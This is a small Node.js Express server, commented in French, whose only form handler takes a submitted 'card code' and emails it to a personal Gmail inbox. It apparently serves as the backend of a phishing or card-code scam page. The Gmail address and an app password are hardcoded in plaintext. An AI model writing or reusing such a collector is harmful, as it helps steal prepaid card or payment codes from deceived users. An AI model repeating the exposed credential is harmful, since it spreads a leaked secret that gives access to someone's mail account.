const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));

const TON_EMAIL = 'wanarnaud@gmail.com'; // <-- remplace par ton email Gmail ici

app.post('/envoyer', async (req, res) => {
  const { carte_code } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'wanarnaud@gmail.com',
      pass: 'fepyypnnlbauqiqx',
    },
  });

  await transporter.sendMail({
    from: TON_EMAIL,
    to: TON_EMAIL,
    subject: 'Code de carte reçu',
    text: `Un utilisateur a soumis ce code : ${carte_code}`,
  });

  res.send("Merci ! Votre code a été envoyé.");
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log("Serveur en ligne sur le port " + port);
});